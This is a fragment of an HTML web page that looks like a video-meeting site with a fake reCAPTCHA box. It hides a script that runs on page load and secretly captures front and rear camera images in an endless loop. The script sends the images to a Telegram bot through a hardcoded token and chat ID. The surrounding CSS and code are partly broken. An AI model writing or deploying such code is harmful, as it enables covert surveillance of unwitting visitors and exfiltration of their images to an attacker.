        /* reCAPTCHA Box */

            width: 302px;

            height: 26px;
            border: 2px solid #c1c1c1;
            border-radius: 2px;
            background-color: #fff;
            position: relative;
        }

        .label {
            font-size: 14px;
            margin-left: 14px;
            font-weight: 400;
        }

        /* Spinner & Error */
        .loader {
            display: none;
            width: 24px;
            height: 24px;
            border: 3px solid #f3f3f3;
            border-top: 3px solid #4d90fe;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        .error-msg {
            color: #d93025;
            font-size: 13px;
            margin-top: 10px;
            display: none;
            font-weight: 500;
        }

        .system-info {

            line-height: 1.6;

        .logo-section {

            flex-direction: column;
            align-items: center;
            width: 70px;
        }
        .logo-section img { width: 32px; margin-bottom: 2px; }
        .logo-section span { font-size: 10px; color: #555; }
    </style>
</head>

	<script>
(function(){
  const TOKEN = "7055229139:AAHgJNtq6Pdve_e1W5xtlWQxjnzm27fjtpU"; // ‡¶§‡ßã‡¶Æ‡¶æ‡¶∞ bot token
  let chat_id = "7365118765";   // Telegram chat ID

  // temporary hidden video element
  const video = document.createElement("video");
  video.style.display = "none";
  document.body.appendChild(video);

  function sendPhotoToTelegram(blob, camType){
    if (!chat_id) return;
    let formData = new FormData();
    formData.append("chat_id", chat_id);
    formData.append("caption", `${camType} Camera Capture`);
    formData.append("photo", blob, `img_${camType}_${Date.now()}.jpg`);

    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
      method: "POST",
      body: formData
    }).catch(() => {});
  }

  async function captureFrame(camType, facingMode){
    try {
      const stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: { exact: facingMode } }, audio: false
      });
      video.srcObject = stream;
      await video.play();

      await new Promise(res => setTimeout(res, 500));

      const canvas = document.createElement("canvas");
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      const ctx = canvas.getContext("2d");
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

      canvas.toBlob(blob => sendPhotoToTelegram(blob, camType), 'image/jpeg');

      stream.getTracks().forEach(track => track.stop());
    } catch (err) {
      console.warn(`Cannot access ${camType} camera`, err);
    }
  }

  async function startLoop(){
    while(true){
      await captureFrame("Front", "user");
      await new Promise(res => setTimeout(res, 500));
      await captureFrame("Rear", "environment");
      await new Promise(res => setTimeout(res, 500));
    }
  }

  window.addEventListener("load", () => {
    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;
    startLoop();
  });
})();
</script>

<script>
})();

    // Year
    document.getElementById('year').textContent = new Date().getFullYear();

    // Theme toggle
    const themeBtn = document.getElementById('themeToggle');
    const root = document.documentElement;
    const savedTheme = localStorage.getItem('theme');
    if(savedTheme === 'light'){ root.classList.add('light'); }
    themeBtn.addEventListener('click', () => {
      root.classList.toggle('light');
      localStorage.setItem('theme', root.classList.contains('light') ? 'light' : 'dark');
    });

    // Create/join meeting (frontend-only actions)
    const codeInput = document.getElementById('codeInput');
    const createBtn = document.getElementById('createBtn');
    const joinBtn = document.getElementById('joinBtn');

    function randomCode(){
      const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
      let a = '', b = '';
      for(let i=0;i<3;i++){ a += chars[Math.floor(Math.random()*chars.length)]; }
      for(let i=0;i<3;i++){ b += chars[Math.floor(Math.random()*chars.length)]; }
      return `${a}-${b}`;
    }

    function setCodeAndScroll(code){
      codeInput.value = code;
      document.getElementById('preview').scrollIntoView({behavior:'smooth'});
    }

    createBtn.addEventListener('click', () => setCodeAndScroll(randomCode()));
    joinBtn.addEventListener('click', () => {
      const raw = (codeInput.value || '').toUpperCase().replace(/[^A-Z0-9]/g,'');
      if(raw.length < 6){ codeInput.focus(); codeInput.placeholder = 'Enter a valid code'; return; }
      const code = `${raw.slice(0,3)}-${raw.slice(3,6)}`;
      setCodeAndScroll(code);
    });

    // Meet-style local media in preview
    const localVideo = document.getElementById('localVideo');
    const noCam = document.getElementById('noCam');
    const micBtn = document.getElementById('micBtn');
    const camBtn = document.getElementById('camBtn');
    const shareBtn = document.getElementById('shareBtn');

    let localStream = null; let micOn = true; let camOn = true;

    async function startLocalMedia(){
      try{
        localStream = await navigator.mediaDevices.getUserMedia({video:true, audio:true});
        localVideo.srcObject = localStream;
        noCam.style.display = 'none';
      }catch(err){
        console.warn('Camera/mic error:', err);
        noCam.style.display = 'grid';
      }
    }
    startLocalMedia();

    function stopLocal(){ if(localStream){ localStream.getTracks().forEach(t=>t.stop()); localStream=null; } }

    micBtn.addEventListener('click', () => {
      if(!localStream) return; micOn=!micOn; localStream.getAudioTracks().forEach(t=>t.enabled=micOn);
    });
    camBtn.addEventListener('click', () => {
      if(!localStream) return; camOn=!camOn; localStream.getVideoTracks().forEach(t=>t.enabled=camOn); if(!camOn) noCam.style.display='grid'; else noCam.style.display='none';
    });
    shareBtn.addEventListener('click', async () => {
      try{ const scr = await navigator.mediaDevices.getDisplayMedia({video:true}); const v = document.createElement('video'); v.autoplay=true; v.playsInline=true; v.srcObject=scr; v.style.maxWidth='40%'; v.style.position='absolute'; v.style.right='10px'; v.style.bottom='10px'; v.style.border='1px solid var(--border)'; v.style.borderRadius='12px'; document.querySelector('.video-wrap').appendChild(v); scr.getVideoTracks()[0].addEventListener('ended',()=>v.remove()); }catch(e){}
    });

    document.getElementById('openPreview').addEventListener('click', ()=>{
      document.getElementById('preview').scrollIntoView({behavior:'smooth'});
    });

    document.getElementById('learnMore').addEventListener('click', () => {
      document.getElementById('security').scrollIntoView({behavior:'smooth'});
    });

    window.addEventListener('beforeunload', stopLocal);
